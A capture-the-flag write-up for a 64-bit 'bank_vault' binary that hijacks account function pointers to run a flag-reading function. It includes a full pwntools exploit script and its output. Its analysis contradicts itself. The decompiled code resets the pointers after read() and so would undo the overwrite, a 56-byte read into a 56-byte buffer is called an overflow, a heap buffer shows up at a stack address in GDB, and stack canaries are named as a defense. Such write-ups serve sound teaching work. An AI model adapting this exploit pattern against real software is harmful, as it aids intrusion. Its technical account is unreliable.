# Bank Vault PWN Challenge Writeup

## Challenge Overview

**Binary:** `bank_vault`
**Architecture:** x86-64 ELF
**Challenge Type:** Buffer Overflow + Function Pointer Hijacking
**Flag:** `flag{auf}`

This challenge presents a simulated banking system with account management functionality. The goal is to exploit a buffer overflow vulnerability to hijack function pointers and redirect execution to a hidden flag-reading function.

## Initial Analysis

### File Information
```bash
$ file bank_vault
bank_vault: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked,
interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=e76ba8d0dc1e589aed60fa6f17459aed9ae10c06,
for GNU/Linux 3.2.0, stripped
```

Key observations:
- 64-bit ELF binary
- Dynamically linked
- **Stripped** (no debugging symbols)

### Security Protections
```bash
$ checksec --file=bank_vault
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH
```

Critical security analysis:
- ❌ **No Stack Canary** - Buffer overflows possible
- ❌ **No PIE** - Predictable memory addresses
- ✅ **NX Enabled** - Stack not executable (no shellcode injection)
- ✅ **Partial RELRO** - Some memory protections active

**Conclusion:** The absence of stack canaries and PIE makes this binary vulnerable to buffer overflow attacks with predictable addresses.

## Dynamic Analysis

### Program Functionality
```bash
$ ./bank_vault
Welcome to the Digital Bank Vault System
Secure account management interface v2.1

Digital Bank Vault System
1. Create Account
2. Delete Account
3. View Account
4. Transfer Funds
5. List Accounts
6. Exit
Choice:
```

The program implements a menu-driven banking system with standard CRUD operations for account management.

### String Analysis
```bash
$ strings bank_vault | grep -i flag
./flag
```

**Key Discovery:** The binary references a file named `./flag`, indicating the presence of a flag-reading mechanism.

## Static Analysis

### Finding the Entry Point
```bash
$ readelf -h bank_vault | grep Entry
Entry point address: 0x401100
```

### Locating Main Function
```bash
$ objdump -d bank_vault -M intel | grep -A 20 "401100"
```

At the entry point, we find:
```assembly
401114:    mov    rdi,0x4018d6    # Load main function address
40111b:    call   QWORD PTR [rip+0x2eb7]  # Call __libc_start_main
```

**Main function address:** `0x4018d6`

### Analyzing the Vulnerable Function

Using Ghidra decompilation of the account creation function (`FUN_004012f8`):

```c
void create_account(void) {
    void *__buf;

    if (DAT_004040a0 < 10) {  // Max 10 accounts
        __buf = malloc(0x38);  // Allocate 56 bytes
        if (__buf == NULL) {
            puts("Memory allocation failed");
            return;
        }

        printf("Enter account name: ");
        fflush(stdout);

        // THE VULNERABILITY:
        uVar2 = read(0, __buf, 0x38);  // Read up to 56 bytes

        if (uVar2 < 0x38) {  // If less than 56 bytes read
            // Null termination logic...
        } else {  // If EXACTLY 56 bytes read - NO NULL TERMINATION!
            // Function pointer setup without bounds checking
            if (*(long *)(__buf + 0x28) == 0) {
                *(code **)(__buf + 0x28) = FUN_00401200;  // display_func
            }
            if (*(long *)(__buf + 0x30) == 0) {
                *(code **)(__buf + 0x30) = FUN_0040122f;  // withdraw_func
            }
        }

        // Normal setup:
        *(__buf + 0x20) = 1000;          // Initial balance
        *(__buf + 0x28) = FUN_00401200;  // display_func pointer
        *(__buf + 0x30) = FUN_0040122f;  // withdraw_func pointer
    }
}
```

### Vulnerability Analysis

**The Bug:** The program allocates 56 bytes and reads up to 56 bytes, but only performs null termination if **fewer than** 56 bytes are read. When exactly 56 bytes are provided, the input can overwrite the function pointers stored in the account structure.

### Account Structure Layout

Through static analysis of memory access patterns:

```c
struct account_struct {
    char name[32];           // 0x00-0x1F: Account name buffer
    uint64_t balance;        // 0x20-0x27: Account balance (set to 1000)
    void (*display_func)();  // 0x28-0x2F: Function pointer for account display
    void (*withdraw_func)(); // 0x30-0x37: Function pointer for withdrawals
};
// Total size: 32 + 8 + 8 + 8 = 56 bytes (0x38)
```

### Finding the Target Function

**Method 1: File Operation Analysis**
```bash
$ objdump -d bank_vault | grep -B 10 -A 10 "fopen"
```

**Method 2: String Reference Tracing**
In Ghidra, searching for the `./flag` string leads to function `FUN_00401267`.

**Target Function Analysis (0x401267):**
```c
void flag_function(void) {
    FILE *file;
    char buffer[100];

    puts("Access granted to secure vault system.");
    puts("Retrieving classified data...");

    file = fopen("./flag", "r");
    if (file != NULL) {
        fgets(buffer, 100, file);
        printf("Data retrieved: %s\n", buffer);
        fclose(file);
    } else {
        puts("Flag file not found!");
        puts("Contact system administrator for access.");
        exit(1);
    }
}
```

### Finding the Trigger Mechanism

The "View Account" function (menu option 3) retrieves an account by ID and calls the account's `display_func` pointer:

```c
void view_account(void) {
    int account_id;
    account_struct *account;

    printf("Enter account ID to view: ");
    scanf("%d", &account_id);

    if (account_id >= 0 && account_id < num_accounts) {
        account = accounts[account_id];
        account->display_func(account);  // ← HIJACK POINT!
    }
}
```

## Exploitation Strategy

### Attack Vector
1. **Create Account** (Option 1): Send exactly 56 bytes to overflow the buffer and overwrite function pointers
2. **View Account** (Option 3): Trigger the overwritten function pointer to execute the flag function

### Payload Construction
```python
payload = b'A' * 32          # Fill name buffer (32 bytes)
payload += b'B' * 8          # Overwrite balance field (8 bytes)
payload += p64(0x401267)     # Overwrite display_func with flag function (8 bytes)
payload += p64(0x401267)     # Overwrite withdraw_func as backup (8 bytes)
# Total: 56 bytes exactly
```

## Exploit Implementation

### Setup
```bash
# Create flag file (or symlink to existing)
$ ln -sf fake_flag_testing flag
```

### Python Exploit Script
```python
#!/usr/bin/env python3
from pwn import *

def exploit():
    # Configure pwntools
    context.arch = 'amd64'
    context.log_level = 'info'

    # Start the process
    p = process('./bank_vault')

    # Step 1: Create malicious account
    p.recvuntil(b'Choice: ')
    p.sendline(b'1')  # Create Account

    p.recvuntil(b'Enter account name: ')

    # Craft the payload
    payload = b'A' * 32                    # Name buffer (32 bytes)
    payload += b'B' * 8                    # Balance field (8 bytes) - corrupted but irrelevant
    payload += p64(0x401267)               # Overwrite display_func with flag function
    payload += p64(0x401267)               # Overwrite withdraw_func (backup)

    assert len(payload) == 56, f"Payload must be exactly 56 bytes, got {len(payload)}"

    # Send payload (no newline to ensure exactly 56 bytes)
    p.send(payload)

    # Step 2: Trigger the hijacked function pointer
    p.recvuntil(b'Choice: ')
    p.sendline(b'3')  # View Account

    p.recvuntil(b'Enter account ID to view: ')
    p.sendline(b'0')  # Our account has ID 0

    # Step 3: Capture the flag
    response = p.recvall(timeout=3)
    print(response.decode())

    p.close()

if __name__ == "__main__":
    exploit()
```

### Execution
```bash
$ python3 exploit.py
[+] Starting local process './bank_vault': pid 13517
[*] Process './bank_vault' stopped with exit code 0 (pid 13517)
Access granted to secure vault system.
Retrieving classified data...
Data retrieved: flag{auf}
```

## Debugging and Verification

### GDB Analysis
```bash
$ gdb -q bank_vault
(gdb) break *0x40134b    # Break after read() call in create_account
(gdb) run
# Input the 56-byte payload
(gdb) x/7gx $rbx         # Examine the account structure
```

**Expected memory layout after overflow:**
```
0x7ffe12340000: 0x4141414141414141   # name[0-7] = "AAAAAAAA"
0x7ffe12340008: 0x4141414141414141   # name[8-15] = "AAAAAAAA"
0x7ffe12340010: 0x4141414141414141   # name[16-23] = "AAAAAAAA"
0x7ffe12340018: 0x4141414141414141   # name[24-31] = "AAAAAAAA"
0x7ffe12340020: 0x4242424242424242   # balance = 0x4242424242424242 (corrupted)
0x7ffe12340028: 0x0000000000401267   # display_func = flag_function ← SUCCESS!
0x7ffe12340030: 0x0000000000401267   # withdraw_func = flag_function ← SUCCESS!
```

### Verification Steps
1. **Structure Overwrite:** Confirmed function pointers overwritten with target address
2. **Trigger Mechanism:** View Account option successfully calls hijacked function
3. **Flag Retrieval:** Flag function executes and displays flag content

## Key Learning Points

### Vulnerability Class
- **Buffer Overflow:** Lack of bounds checking on user input
- **Function Pointer Hijacking:** Overwriting code pointers to redirect execution
- **Logic Flaw:** Inconsistent null termination logic based on input length

### Exploitation Techniques
- **Structure Layout Analysis:** Reverse engineering memory layout through static analysis
- **Code Reuse:** Redirecting execution to existing code rather than injecting shellcode
- **Precise Payload Crafting:** Exact byte count required to trigger vulnerability

### Defense Mechanisms (What Could Prevent This)
- **Stack Canaries:** Would detect buffer overflow
- **FORTIFY_SOURCE:** Would add bounds checking to dangerous functions
- **PIE/ASLR:** Would make target addresses unpredictable
- **Input Validation:** Proper bounds checking and null termination
- **Control Flow Integrity:** Would prevent function pointer hijacking

## References

- **Challenge Files:** `bank_vault`, `fake_flag_testing`
- **Tools Used:** Ghidra, GDB, pwntools, objdump, checksec
- **Vulnerability Type:** CWE-120 (Buffer Copy without Checking Size of Input)

---

**Flag:** `flag{auf}`

*This writeup demonstrates a complete end-to-end binary exploitation process from initial reconnaissance through successful exploitation.*  
